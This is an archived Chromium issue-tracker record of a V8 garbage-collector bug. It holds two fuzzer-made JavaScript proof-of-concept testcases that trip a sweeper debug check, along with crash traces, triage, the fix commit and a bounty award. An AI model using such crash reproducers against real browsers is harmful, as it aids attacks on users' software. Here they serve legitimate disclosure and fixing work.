# Security: Fatal error in ../../src/heap/sweeper.cc

| Field | Value |
|-------|-------|
| **Issue ID** | [40062058](https://issues.chromium.org/issues/40062058) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>JavaScript>GarbageCollection |
| **Platforms** | Linux |
| **Reporter** | wh...@gmail.com |
| **Assignee** | di...@chromium.org |
| **Created** | 2022-12-06 |
| **Bounty** | $7,000.00 |

## Description

**This template is ONLY for reporting security bugs. If you are reporting a**  

**Download Protection Bypass bug, please use the "Security - Download**  

**Protection" template. For all other reports, please use a different**  

**template.**

**Please READ THIS FAQ before filing a bug: <https://chromium.googlesource.com>**  

**/chromium/src/+/HEAD/docs/security/faq.md**

**Please see the following link for instructions on filing security bugs:**  

**<https://www.chromium.org/Home/chromium-security/reporting-security-bugs>**

**Reports may be eligible for reward payments under the Chrome VRP:**  

**<http://g.co/ChromeBugRewards>**

**NOTE: Security bugs are normally made public once a fix has been widely**  

**deployed.**

**-------------------------**

v8 main channel  

commit: 2d51120a9df51aafff6c3e162307ff5497f8354b

function main() {  

function v0(v1,v2) {  

for (let v3 = 0; v3 < 4000; v3++) {  

const v6 = new BigUint64Array(62026);  

}  

const v9 = 1000.0 + "MIN\_VALUE";  

for (let v10 = 0; v10 < 4000; v10++) {  

}  

return v1;  

}  

for (let v11 = 0; v11 < 4000; v11++) {  

const v12 = v0(v0,v0);  

}  

gc();  

}  

%NeverOptimizeFunction(main);  

main();  

// CRASH INFO  

// ==========  

// TERMSIG: 6  

// STDERR:  

// #  

// # Fatal error in ../../src/heap/sweeper.cc, line 681  

// # Debug check failed: page->area\_size() >= static\_cast<size\_t>(marking\_state\_->live\_bytes(page)) (253632 vs. 467772).  

// #  

// #  

// #  

// #FailureMessage Object: 0x7fffaa8f5720  

// ==== C stack trace ===============================  

// /home/uuu/v8\_src.main/v8/out/fuzzbuild/d8(+0x6e4ca2) [0x561f5a013ca2]  

// /home/uuu/v8\_src.main/v8/out/fuzzbuild/d8(+0x6e37c7) [0x561f5a0127c7]  

// /home/uuu/v8\_src.main/v8/out/fuzzbuild/d8(+0x6d652f) [0x561f5a00552f]  

// /home/uuu/v8\_src.main/v8/out/fuzzbuild/d8(+0x6d5eb5) [0x561f5a004eb5]  

// /home/uuu/v8\_src.main/v8/out/fuzzbuild/d8(+0xed70c6) [0x561f5a8060c6]  

// /home/uuu/v8\_src.main/v8/out/fuzzbuild/d8(+0xed69e0) [0x561f5a8059e0]  

// /home/uuu/v8\_src.main/v8/out/fuzzbuild/d8(+0xda45b9) [0x561f5a6d35b9]  

// /home/uuu/v8\_src.main/v8/out/fuzzbuild/d8(+0xdac22d) [0x561f5a6db22d]  

// /home/uuu/v8\_src.main/v8/out/fuzzbuild/d8(+0xda7df9) [0x561f5a6d6df9]  

// /home/uuu/v8\_src.main/v8/out/fuzzbuild/d8(+0xd4de7f) [0x561f5a67ce7f]  

// /home/uuu/v8\_src.main/v8/out/fuzzbuild/d8(+0xd49bc2) [0x561f5a678bc2]  

// /home/uuu/v8\_src.main/v8/out/fuzzbuild/d8(+0xd46354) [0x561f5a675354]  

// /home/uuu/v8\_src.main/v8/out/fuzzbuild/d8(+0xd44ee3) [0x561f5a673ee3]  

// /home/uuu/v8\_src.main/v8/out/fuzzbuild/d8(+0xc42cd9) [0x561f5a571cd9]  

// /home/uuu/v8\_src.main/v8/out/fuzzbuild/d8(+0x1833f1c) [0x561f5b162f1c]  

// /home/uuu/v8\_src.main/v8/out/fuzzbuild/d8(+0x183384c) [0x561f5b16284c]  

// [0x561edfeaf978]  

// Received signal 6  

// STDOUT:  

// [COV] edge counters initialized. Shared memory: shm\_id\_3072076\_8 with 893006 edges  

// [COV] Additional 0 edges for builtins initialized.  

// ARGS: /home/uuu/v8\_src.main/v8/out/fuzzbuild/d8 --expose-gc --future --harmony --assert-types --harmony-rab-gsab --harmony-struct --allow-natives-syntax --interrupt-budget=1000 --fuzzing

## Timeline

### [Deleted User] (2022-12-06)

[Empty comment from Monorail migration]

### wh...@gmail.com (2022-12-06)

also this poc

function main() {
function v2(v3,v4) {
    const v6 = new Int16Array(455480.23478687136);
    const v8 = -2894897057 + "YV5xfK";
    return Int16Array;
}
for (let v9 = 0; v9 < 4000; v9++) {
    const v10 = v2();
}
gc();
}
%NeverOptimizeFunction(main);
main();

run with /d8 --expose-gc --assert-types --harmony-struct --allow-natives-syntax ./1.js

#
# Fatal error in ../../src/heap/sweeper.cc, line 681
# Debug check failed: page->area_size() >= static_cast<size_t>(marking_state_->live_bytes(page)) (253632 vs. 1508792).
#
#
#
#FailureMessage Object: 0x7fff9a049140
==== C stack trace ===============================

    /home/uuu/v8_src.main/v8/out/x64.debug/libv8_libbase.so(v8::base::debug::StackTrace::StackTrace()+0x1e) [0x7f99e96618ae]
    /home/uuu/v8_src.main/v8/out/x64.debug/libv8_libplatform.so(+0x4ad9d) [0x7f99e95b6d9d]
    /home/uuu/v8_src.main/v8/out/x64.debug/libv8_libbase.so(V8_Fatal(char const*, int, char const*, ...)+0x16f) [0x7f99e963051f]
    /home/uuu/v8_src.main/v8/out/x64.debug/libv8_libbase.so(+0x56fac) [0x7f99e962ffac]
    /home/uuu/v8_src.main/v8/out/x64.debug/libv8_libbase.so(V8_Dcheck(char const*, int, char const*)+0x27) [0x7f99e96305c7]
    /home/uuu/v8_src.main/v8/out/x64.debug/libv8.so(v8::internal::Sweeper::PrepareToBeSweptPage(v8::internal::AllocationSpace, v8::internal::Page*)+0x89) [0x7f99ecbc58c9]
    /home/uuu/v8_src.main/v8/out/x64.debug/libv8.so(v8::internal::Sweeper::AddPageImpl(v8::internal::AllocationSpace, v8::internal::Page*, v8::internal::Sweeper::AddPageMode)+0x135) [0x7f99ecbc55d5]
    /home/uuu/v8_src.main/v8/out/x64.debug/libv8.so(v8::internal::Sweeper::AddPage(v8::internal::AllocationSpace, v8::internal::Page*, v8::internal::Sweeper::AddPageMode)+0xad) [0x7f99ecbc548d]
    /home/uuu/v8_src.main/v8/out/x64.debug/libv8.so(v8::internal::CollectorBase::StartSweepSpace(v8::internal::PagedSpace*)+0x2ca) [0x7f99eca94cba]
    /home/uuu/v8_src.main/v8/out/x64.debug/libv8.so(v8::internal::MarkCompactCollector::Sweep()+0x461) [0x7f99eca9c311]
    /home/uuu/v8_src.main/v8/out/x64.debug/libv8.so(v8::internal::MarkCompactCollector::CollectGarbage()+0xa3) [0x7f99eca97383]
    /home/uuu/v8_src.main/v8/out/x64.debug/libv8.so(v8::internal::Heap::MarkCompact()+0x12b) [0x7f99eca1d39b]
    /home/uuu/v8_src.main/v8/out/x64.debug/libv8.so(v8::internal::Heap::PerformGarbageCollection(v8::internal::GarbageCollector, v8::internal::GarbageCollectionReason, char const*)+0x752) [0x7f99eca1a102]
    /home/uuu/v8_src.main/v8/out/x64.debug/libv8.so(v8::internal::Heap::CollectGarbage(v8::internal::AllocationSpace, v8::internal::GarbageCollectionReason, v8::GCCallbackFlags)+0xa8a) [0x7f99eca1738a]
    /home/uuu/v8_src.main/v8/out/x64.debug/libv8.so(v8::internal::Heap::CollectAllGarbage(int, v8::internal::GarbageCollectionReason, v8::GCCallbackFlags)+0x39) [0x7f99eca16169]
    /home/uuu/v8_src.main/v8/out/x64.debug/libv8.so(v8::internal::Heap::HandleGCRequest()+0xed) [0x7f99eca160ad]
    /home/uuu/v8_src.main/v8/out/x64.debug/libv8.so(v8::internal::StackGuard::HandleInterrupts()+0x410) [0x7f99ec8a9ff0]
    /home/uuu/v8_src.main/v8/out/x64.debug/libv8.so(+0x3db55d4) [0x7f99ed42b5d4]
    /home/uuu/v8_src.main/v8/out/x64.debug/libv8.so(v8::internal::Runtime_StackGuardWithGap(int, unsigned long*, v8::internal::Isolate*)+0x128) [0x7f99ed42b118]
    [0x7f997f96eb3f]
[1]    3280754 trace trap (core dumped)  ./d8 --expose-gc --assert-types --harmony-struct --allow-natives-syntax ./1.js

### cl...@chromium.org (2022-12-06)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=4667937043709952.

### cl...@chromium.org (2022-12-06)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=6240649579003904.

### cl...@chromium.org (2022-12-06)

Automatically applying components based on crash stacktrace and information from OWNERS files.

If this is incorrect, please apply the Test-Predator-Wrong-Components label.

[Monorail components: Blink>JavaScript>GarbageCollection]

### cl...@chromium.org (2022-12-06)

ClusterFuzz testcase 6240649579003904 appears to be flaky, updating reproducibility label.

### cl...@chromium.org (2022-12-06)

Detailed Report: https://clusterfuzz.com/testcase?key=6240649579003904

Fuzzer: None
Job Type: linux_asan_d8_dbg
Platform Id: linux

Crash Type: DCHECK failure
Crash Address: 
Crash State:
  page->area_size() >= static_cast<size_t>(marking_state_->live_bytes(page)) in sw
  v8::internal::Sweeper::PrepareToBeSweptPage
  v8::internal::Sweeper::AddPageImpl
  
Sanitizer: address (ASAN)

Crash Revision: https://clusterfuzz.com/revisions?job=linux_asan_d8_dbg&revision=84674

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=6240649579003904

To reproduce this, please build the target in this report and run it against the reproducer testcase. Please use the GN arguments provided at bottom of this report when building the binary. 

If you have trouble reproducing, please also export the environment variables listed under "[Environment]" in the crash stacktrace.

If you have any feedback on reproducing test cases, let us know at https://forms.gle/Yh3qCYFveHj6E5jz5 so we can improve.


************************* UNREPRODUCIBLE *************************
Note: This crash might not be reproducible with the provided testcase. That said, for the past 14 days, we've been seeing this crash frequently.

It may be possible to reproduce by trying the following options:
- Run testcase multiple times for a longer duration.
- Run fuzzing without testcase argument to hit the same crash signature.

If it still does not reproduce, try a speculative fix based on the crash stacktrace and verify if it works by looking at the crash statistics in the report. We will auto-close the bug if the crash is not seen for 14 days.
******************************************************************

### ad...@google.com (2022-12-06)

mlippautz@ could you triage this one from here?

If this is denial-of-service we wouldn't consider it a security bug. https://chromium.googlesource.com/chromium/src/+/main/docs/security/faq.md#Are-denial-of-service-issues-considered-security-bugs

If this can be exploited to cause memory corruption please add Security_Severity-High.

As it's flakey, ClusterFuzz has been unable to set an appropriate FoundIn label to tell us the earliest affected release branch. So can you also let us know if this seems to be a recent regression, or if this is likely to affect stable?

### ml...@chromium.org (2022-12-06)

Dominik, any chance you have cycles to look at this?

### di...@chromium.org (2022-12-06)

Yeah, I will take over. Judging from the use command line flags this seems shared heap related anyways.

@reporter:Hi, thanks for reporting this! What gn args flag are you using for reproducing this?

### di...@chromium.org (2022-12-06)

Nevermind, this was simple enough to reproduce.

### gi...@appspot.gserviceaccount.com (2022-12-06)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8/+/198ad337d5135a865793b4e09f5ba5fda4f1c5d2

commit 198ad337d5135a865793b4e09f5ba5fda4f1c5d2
Author: Dominik Inführ <dinfuehr@chromium.org>
Date: Tue Dec 06 13:17:41 2022

[heap] Fix unmarking of LABs in shared heap

Heap::UnmarkSharedLinearAllocationAreas was calling the wrong methods
to unmark shared heap LABs.

Bug: v8:13267, chromium:1396222
Change-Id: Ic101bdac2fa22b6a2640a94f3b444064a2339b5d
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/4079628
Commit-Queue: Dominik Inführ <dinfuehr@chromium.org>
Reviewed-by: Michael Lippautz <mlippautz@chromium.org>
Cr-Commit-Position: refs/heads/main@{#84685}

[modify] https://crrev.com/198ad337d5135a865793b4e09f5ba5fda4f1c5d2/src/heap/heap.cc


### di...@chromium.org (2022-12-06)

Should be fixed now. Please re-open if this is not the case.

### [Deleted User] (2022-12-06)

[Empty comment from Monorail migration]

### [Deleted User] (2022-12-06)

[Empty comment from Monorail migration]

### wh...@gmail.com (2022-12-07)

I tested poc again, it fixed.

### am...@google.com (2022-12-15)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@chromium.org (2022-12-16)

Congratulations! The VRP Panel has decided to award you $7,000 for this report. A member of our finance team will be in touch with you soon to arrange payment. Thank you for your efforts in discovering and reporting this issue to us -- nice work! 

### am...@google.com (2022-12-16)

[Empty comment from Monorail migration]

### [Deleted User] (2023-03-14)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### is...@google.com (2023-03-14)

This issue was migrated from crbug.com/chromium/1396222?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40062058)*
